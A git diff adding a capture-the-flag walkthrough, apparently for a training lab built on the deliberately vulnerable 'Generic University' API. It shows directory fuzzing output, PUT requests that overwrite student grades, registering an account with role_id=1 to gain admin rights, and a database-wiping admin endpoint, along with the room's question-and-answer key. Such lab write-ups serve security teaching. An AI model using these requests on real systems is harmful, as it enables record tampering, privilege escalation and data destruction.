@@ -267,3 +267,272 @@ https://github.com/InsiderPhD/Generic-University/blob/master/routes/web.php
 ===============================================================
 Gobuster v3.5
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.58.242/api
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+http://10.10.58.242/api/admin                (Status: 302) [Size: 346] [--> http://10.10.58.242/login]
+http://10.10.58.242/api/cgi-bin/             (Status: 301) [Size: 317] [--> http://10.10.58.242/api/cgi-bin]
+http://10.10.58.242/api/classes              (Status: 500) [Size: 623308]
+http://10.10.58.242/api/roles                (Status: 500) [Size: 623270]
+http://10.10.58.242/api/user                 (Status: 302) [Size: 346] [--> http://10.10.58.242/login]
+http://10.10.58.242/api/users                (Status: 500) [Size: 623270]
+Progress: 4614 / 4615 (99.98%)
+===============================================================
+ Finished
+===============================================================
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cat /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt | grep -n grades     
+4376:upgrades
+18869:grades
+116135:upgradestep1
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -u http://10.10.58.242/api/FUZZ -t 10 -timeout 30 -X PUT
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.0.0-dev
+________________________________________________
+
+ :: Method           : PUT
+ :: URL              : http://10.10.58.242/api/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 30
+ :: Threads          : 10
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+[Status: 405, Size: 558375, Words: 23393, Lines: 158, Duration: 301ms]
+    * FUZZ: admin
+[Status: 405, Size: 558374, Words: 23393, Lines: 158, Duration: 273ms]
+    * FUZZ: user
+[Status: 405, Size: 558407, Words: 23398, Lines: 158, Duration: 228ms]
+    * FUZZ: classes
+[Status: 405, Size: 558405, Words: 23398, Lines: 158, Duration: 255ms]
+    * FUZZ: users
+[Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 195ms]
+    * FUZZ: .
+[Status: 405, Size: 558406, Words: 23398, Lines: 158, Duration: 236ms]
+    * FUZZ: grades
+[Status: 405, Size: 558405, Words: 23398, Lines: 158, Duration: 237ms]
+    * FUZZ: roles
+
+PUT /api/grades HTTP/1.1
+
+HTTP/1.0 405 Method Not Allowed
+
+SQLSTATE[HY000] [2002] Connection refused (SQL: select * from `grades` where `user_id` is null) 
+
+PUT /api/grades/1 HTTP/1.1
+
+{"id":1,"grade":6,"comments":"Good job!","created_at":"2022-04-06T09:34:56.000000Z","updated_at":"2022-04-06T09:34:56.000000Z","user_id":1,"uni_class_id":1}
+
+PUT /api/grades/2 HTTP/1.1
+
+{"id":2,"grade":28,"comments":"Good job!","created_at":"2022-04-06T09:34:56.000000Z","updated_at":"2022-04-06T09:34:56.000000Z","user_id":1,"uni_class_id":2}
+
+PUT /api/grades/3 HTTP/1.1
+
+{"id":3,"grade":15,"comments":"Good job!","created_at":"2022-04-06T09:34:56.000000Z","updated_at":"2022-04-06T09:34:56.000000Z","user_id":1,"uni_class_id":3}
+
+PUT /api/grades/4 HTTP/1.1
+
+{"id":4,"grade":55,"comments":"Good job!","created_at":"2022-04-06T09:34:56.000000Z","updated_at":"2022-04-06T09:34:56.000000Z","user_id":1,"uni_class_id":4}
+
+PUT /api/grades/5 HTTP/1.1
+
+{"id":5,"grade":3,"comments":"Good job!","created_at":"2022-04-06T09:34:56.000000Z","updated_at":"2022-04-06T09:34:56.000000Z","user_id":1,"uni_class_id":5}
+
+PUT /api/grades/6 HTTP/1.1
+
+{"id":6,"grade":7,"comments":"Good job!","created_at":"2022-04-06T09:34:56.000000Z","updated_at":"2022-04-06T09:34:56.000000Z","user_id":2,"uni_class_id":1}
+
+PUT /api/grades/7 HTTP/1.1
+
+{"id":7,"grade":40,"comments":"Good job!","created_at":"2022-04-06T09:34:56.000000Z","updated_at":"2022-04-06T09:34:56.000000Z","user_id":2,"uni_class_id":2}
+
+PUT /api/grades/8 HTTP/1.1
+
+{"id":8,"grade":30,"comments":"Good job!","created_at":"2022-04-06T09:34:56.000000Z","updated_at":"2022-04-06T09:34:56.000000Z","user_id":2,"uni_class_id":3}
+
+and now my new user will get 1000 :)
+
+PUT /api/grades/12 HTTP/1.1
+
+grade=1000&comments=1337 :)
+
+{"id":12,"grade":"1000","comments":"1337 :)","created_at":"2022-04-06T09:34:56.000000Z","updated_at":"2023-03-17T21:27:34.000000Z","user_id":3,"uni_class_id":2}
+```
+![[Pasted image 20230317124824.png]]
+What API endpoint may allow someone to edit a grade?
+Syntax: [Method] [URL] eg GET /some/route
+*PUT /api/grades*
+What API endpoint shows all individuals holding accounts?
+*GET /api/users*
+What API endpoint shows all the possible courses on Generic University?
+*GET /api/classes*
+### Get an account
+Now we have done some basic recon, we will need an account for further testing, can you register an account?
+Answer the questions below
+```text
+┌──(witty㉿kali)-[~/Downloads]
+└─$ gobuster dir -e -k -u http://10.10.58.242 -w /usr/share/dirb/wordlists/common.txt
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.58.242
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+http://10.10.58.242/.hta                 (Status: 403) [Size: 277]
+http://10.10.58.242/.htaccess            (Status: 403) [Size: 277]
+http://10.10.58.242/.htpasswd            (Status: 403) [Size: 277]
+http://10.10.58.242/admin                (Status: 200) [Size: 117]
+http://10.10.58.242/cgi-bin/             (Status: 301) [Size: 313] [--> http://10.10.58.242/cgi-bin]
+http://10.10.58.242/contact              (Status: 200) [Size: 4462]
+http://10.10.58.242/favicon.ico          (Status: 200) [Size: 0]
+http://10.10.58.242/home                 (Status: 200) [Size: 3584]
+http://10.10.58.242/images               (Status: 301) [Size: 313] [--> http://10.10.58.242/images/]
+http://10.10.58.242/index.php            (Status: 200) [Size: 3634]
+http://10.10.58.242/login                (Status: 200) [Size: 5645]
+http://10.10.58.242/logout               (Status: 405) [Size: 558291]
+http://10.10.58.242/register             (Status: 200) [Size: 5712]
+http://10.10.58.242/robots.txt           (Status: 200) [Size: 24]
+http://10.10.58.242/server-status        (Status: 403) [Size: 277]
+http://10.10.58.242/web.config           (Status: 200) [Size: 1194]
+Progress: 4614 / 4615 (99.98%)
+===============================================================
+ Finished
+===============================================================
+
+http://10.10.106.64/api/users
+
+[{"id":1,"name":"Javon Moen","email":"johnathon71@rolfson.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2},{"id":2,"name":"Barbara Bauch","email":"pabshire@yahoo.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2},{"id":3,"name":"Muriel Mante","email":"jgerlach@yahoo.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2},{"id":4,"name":"Jalon Fisher","email":"tmiller@hotmail.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2},{"id":5,"name":"Taya Kohler","email":"hspinka@yahoo.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2},{"id":6,"name":"IT Nicola Langworth","email":"laura97@douglas.net","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":1},{"id":7,"name":"Dr Judge Klein","email":"milo.goyette@medhurst.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":3}]
+
+Using burp
+
+Request
+POST /api/users HTTP/1.1
+
+Response
+Illuminate\Database\QueryException: SQLSTATE[HY000]: General error: 1364 Field 'name' doesn't have a default value (SQL: insert into `users` (`role_id`, `updated_at`, `created_at`) values (2, , )) in file /var/www/html/Generic-University/vendor/laravel/framework/src/Illuminate/Database/Connection.php on line 671
+
+so need field name
+
+POST /api/users HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 12
+name=witty
+
+Illuminate\Database\QueryException: SQLSTATE[HY000]: General error: 1364 Field 'email' doesn't have a default value (SQL: insert into `users` (`role_id`, `name`, `updated_at`, `created_at`) values (2, witty, , )) in file /var/www/html/Generic-University/vendor/laravel/framework/src/Illuminate/Database/Connection.php on line 671
+
+Now email field
+
+name=witty&email=witty@gmail.com
+
+Illuminate\Database\QueryException: SQLSTATE[HY000]: General error: 1364 Field 'password' doesn't have a default value (SQL: insert into `users` (`role_id`, `name`, `email`, `updated_at`, `created_at`) values (2, witty, witty@gmail.com, , )) in file /var/www/html/Generic-University/vendor/laravel/framework/src/Illuminate/Database/Connection.php on line 671
+
+and a pass
+
+name=witty&email=witty@gmail.com&password=witty
+
+HTTP/1.1 201 Created
+
+{"role_id":2,"name":"witty","email":"witty@gmail.com","updated_at":"2023-03-17T20:58:44.000000Z","created_at":"2023-03-17T20:58:44.000000Z","id":8}
+
+name=witty1&email=witty1@gmail.com&password=witty&role_id=1
+
+{"role_id":"1","name":"witty1","email":"witty1@gmail.com","updated_at":"2023-03-17T21:02:45.000000Z","created_at":"2023-03-17T21:02:45.000000Z","id":10}
+
+cannot login, after pressing reset pass (error 500)
+
+so role_id=1  means admin cz at the time to create a new user, for default create with role_id=2
+```
+What endpoint lets you create an account?
+*GET /register/*
+What other endpoint lets you create an account?
+*POST /api/users/*
+Why doesn't this work?
+syntax: [action] [function]
+reset [function]
+*reset password*
+### Becoming an admin
+*Hacker Noises*, we're in, but what next?
+Answer the questions below
+```text
+http://10.10.106.64/admin
+
+Welcome to the admin dashboard
+
+Security Vulnerabilities
+
+http://10.10.106.64/admin/security
+
+vuln: Information disclosure of grades
+
+vuln: Information disclosure of grades
+
+vuln: IDOR on most endpoints
+
+vuln: IDOR on most endpoints
+
+GET /api/admin HTTP/1.1
+
+[{"endpoint":"\/","desc":"Shows this manual"},{"endpoint":"restore","desc":"Restores the database from last manual backup"},{"endpoint":"delete","desc":"deletes everything from the database NO BACKUP"}]
+```
+What is the role ID for the Admin role?
+*1*
+What HTTP request method allows you to change a user?
+*PUT*
+### Admin Panels
+Answer the questions below
+```text
+GET /api/admin/restore HTTP/1.1
+
+permission required :(
+
+GET /api/admin/delete HTTP/1.1
+
+permission required :(
+
+using burp
+
+POST /register HTTP/1.1
+
+_token=k..&name=w&email=w%40gmail.com&password=TSsMwEwRWWb6YDa&password_confirmation=TSsMwEwRWWb6YDa&role_id=1
+```
+What is the path of the first admin panel (security vulnerabilities)?
+*/admin/*
+What is the path of the second admin panel (delete and restore)?
+*/api/admin*
+What is the request that deletes all the data format: [HTTP method] [path]
+*GET /api/admin/delete*
+
+## Notes / Lessons Learned
+[[hackerNote]]
+
